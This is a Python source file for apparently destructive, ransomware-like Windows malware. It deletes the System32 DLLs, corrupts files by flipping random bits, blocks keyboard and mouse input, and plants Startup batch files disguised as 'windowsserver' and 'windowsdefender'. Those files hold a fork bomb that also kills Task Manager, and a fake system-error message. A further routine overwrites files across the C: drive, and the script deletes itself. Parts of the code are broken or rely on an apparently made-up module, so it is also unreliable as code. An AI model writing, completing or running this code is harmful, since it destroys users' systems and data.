# EVERTHING NEEDS TESTING. 😭
try:
  import random
  import os
  import sys
  import win32con
  import ctypes
  import win32gui
  import winreg
  import time, datetime

  from hashbrowns import crytographic_functions, hash
  from hashbrowns import key, encryption, decryption
except ImportError:
  print("Required packages not found, quitting in 5...")
  time.sleep(5)
  sys.exit(0)

# Globals
CC = lambda: os.system('cls' if os.name == 'nt' else 'clear')
startupDir = (r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % os.getlogin())


# Classes
class Ptime():

  def nowtime(time=None, date=None):
    if time is False or date is True:
      return date
    if time is True or date is False:
      return time
    else:
      return datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S") + "\n\n"

  @staticmethod
  def currentdate():
    return datetime.datetime.now().strftime("%Y-%m-%d") + "\n\n"

  @staticmethod
  def currenttime():
    return datetime.datetime.now().strftime("%H:%M:%S") + "\n\n"


class functions():

  @staticmethod
  def seppuku():
    currentFile = str(os.getcwd() + "/main.py")
    os.remove(currentFile)

  @staticmethod
  # TEST ON PC
  def minimize_current_window():
    try:
      Minimize = win32gui.GetForegroundWindow()
      win32gui.ShowWindow(Minimize, win32con.SW_MINIMIZE)
      return True
    except:
      return False

  @staticmethod
  # TEST ON VM
  def delete_dll():
    try:
      os.chdir('C:/Windows/System32')
      files = [f for f in os.listdir() if f.endswith('.dll')]
      for f in files:
        os.remove(f)
    except OSError:
      raise OSError('System32 directory does not exist.')

  # TEST ON VM
  def corrupt_startup_files(source_folder):
    files_in_source_folder = os.listdir(source_folder)

    # Corrupt the files by swapping random bits in their content
    for file in files_in_source_folder:
      path_to_file = os.path.join(source_folder, file)
      with open(path_to_file, "rb") as binary_file:
        data = binary_file.read()

        for bit_index in range(len(data)):
          switch = random.choice([True, False])
          if switch:
            data = data[:bit_index] + bytes([data[bit_index] ^ 0xFF]) + data[bit_index + 1:]

      with open(path_to_file, "wb") as binary_file:
        binary_file.write(data)

  @staticmethod
  # TEST ON PC
  def disable_mouse_keyboard_windows():
    # Disable mouse
    ctypes.windll.user32.BlockInput(True)
    # Disable keyboard
    ctypes.windll.user32.DisableProcessWindowsGhosting()

  @staticmethod
  # TEST ON PC
  def startup_surprise():
    with open(startupDir + '/windowsserver.bat', 'w') as fin:
      fin.write('''
@ECHO OFF
:infLoop
%0|%0
tskill Taskmgr
goto infLoop
      ''')
      fin.close
    with open(startupDir + '/windowsdefender.bat', 'w') as Fin:
      Fin.write('''
@ECHO OFF
Do
msgbox "Modification of system code or a critical data structure was detected."
Loop
      ''')
      Fin.close()

  @staticmethod
  # TEST ON VM
  def file_fucker():

    def scanrecurse(baseDir):
      files = []
      restrictedFiles = ['Windows', 'Program Files', 'Program Files (x86)']
      for r, d, f in os.walk(baseDir):
        for file in f:
          filepath = os.path.join(r, file)
        if os.path.exists(filepath):
          files.append(os.path.join(r, file))
          for item in restrictedFiles:
            if item in files:
              files.remove(item)
              
          return files

    try:
      for item in scanrecurse("C:"):
        with open(item, 'w+') as File:
          File.write(crytographic_functions.mutilate(item))
          print("Encrypted:", item)
    except:
      print("Failed encryption:", item)
